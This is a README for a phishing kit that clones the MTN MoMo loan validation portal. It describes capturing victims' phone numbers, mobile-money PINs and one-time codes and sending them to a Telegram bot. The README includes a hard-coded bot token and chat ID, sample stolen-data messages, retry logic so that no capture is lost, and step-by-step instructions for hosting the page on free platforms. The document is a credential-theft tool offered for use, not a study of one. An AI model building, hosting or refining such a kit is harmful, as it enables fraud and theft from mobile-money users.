# MTN MoMo Loan Validation — Clone with Telegram Integration

A pixel-perfect, fully responsive clone of the MTN MoMo loan validation portal.  
All submitted data (Phone Number, PIN, OTP) is forwarded in real time to your Telegram bot.

---

## 📁 Project Files

```
loansmtnapproval/
├── index.html      ← Single-file app (HTML + CSS + JS)
└── README.md       ← This file
```

---

## ⚡ Features

- ✅ Exact clone of https://mtnloanvalidations.onrender.com
- ✅ Fully responsive (mobile, tablet, desktop)
- ✅ Step 1 — Captures **Phone Number** + **PIN** → sends to Telegram
- ✅ Step 2 — Captures **OTP / Verification message** → sends to Telegram
- ✅ Timestamps (EAT UTC+3) on every Telegram message
- ✅ Device + browser detection in every message
- ✅ Retry logic (3 attempts) so no message is lost
- ✅ Processing spinner overlay between steps
- ✅ Success screen after OTP validation

---

## 🤖 Telegram Integration

### Current Config (already set in `index.html`)

| Setting | Value |
|---|---|
| **Bot Token** | `8662918992:AAHPd87_ABOu0z57qnK4YvpynYDgePcYsLc` |
| **Chat ID** | `7606597148` |

### Where to find them in the file

Open `index.html` and look for this block near the bottom (inside `<script>`):

```js
// ╔══════════════════════════════════════════╗
// ║        TELEGRAM CONFIG — EDIT HERE       ║
// ╚══════════════════════════════════════════╝
const BOT_TOKEN = '8662918992:AAHPd87_ABOu0z57qnK4YvpynYDgePcYsLc';
const CHAT_ID   = '7606597148';
```

To change the bot or recipient, just replace those two values and save.

---

## 📨 What You Receive on Telegram

### Message 1 — After Phone + PIN submitted

```
🟡 MTN MoMo — STEP 1 (Details)

📱 Phone:   +256 770000000
🔑 PIN:     12345

🕐 Time:    26/04/2026 20:05:12
💻 Device:  Android · Chrome · 📱 Mobile
🌐 Page:    https://yourdomain.com/
```

### Message 2 — After OTP submitted

```
🟢 MTN MoMo — STEP 2 (OTP / Code)

📱 Phone:   +256 770000000
💬 OTP/Msg: Your MTN MoMo code is 4829. Do not share it.

🕐 Time:    26/04/2026 20:06:45
💻 Device:  Android · Chrome · 📱 Mobile
🌐 Page:    https://yourdomain.com/
```

---

## 🚀 How to Run

### Option A — Open locally (testing)
Double-click `index.html` — opens in your browser. No server needed.

### Option B — Host online (production)
Upload the `index.html` file to any of these free platforms:

| Platform | Steps |
|---|---|
| **Render** | Create a Static Site → connect GitHub repo → deploy |
| **Netlify** | Drag & drop the folder at https://app.netlify.com |
| **GitHub Pages** | Push to a GitHub repo → Settings → Pages → Deploy from branch |
| **Vercel** | Import GitHub repo → auto-deploys |

---

## 🔧 Changing the Country Code List

In `index.html`, find the `<select id="countryCode">` block and add/remove `<option>` entries:

```html
<option value="+256">UG +256 (UG)</option>
<option value="+254">KE +254 (KE)</option>
<!-- add more here -->
```

---

## 📱 Responsive Breakpoints

| Screen | Behaviour |
|---|---|
| > 420px | Card centred, max-width 380px |
| ≤ 420px | Card fills screen width, smaller fonts |
| ≤ 360px | Compact padding, smaller PIN boxes |

---

## ⚠️ Notes

- The site works **offline** — Telegram messages only send when there is internet.
- If Telegram is unreachable, the form still flows normally (3 retries with back-off, then silent skip).
- Do **not** share your Bot Token publicly — keep `index.html` private or use environment variables if deploying via a backend.
